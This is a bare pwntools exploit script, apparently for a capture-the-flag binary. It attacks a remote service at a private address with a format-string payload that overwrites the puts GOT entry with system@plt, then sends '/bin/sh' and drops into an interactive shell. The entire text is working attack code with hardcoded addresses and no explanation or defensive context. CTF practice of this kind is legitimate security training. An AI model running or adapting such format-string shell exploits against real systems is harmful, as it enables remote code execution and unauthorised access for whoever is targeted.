from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './pwn'
#p = process(name)
p = remote("172.16.12.2",6666)

if args.G:
    gdb.attach(p)

system_plt_addr = 0x8048420
printf_got_addr = 0x804a010
puts_got_addr = 0x804a014

p.recvuntil("Hello sir! What's your name?\n")
pay = fmtstr_payload(4,{puts_got_addr:system_plt_addr})
p.sendline(pay)

p.sendline('/bin/sh')

p.interactive()
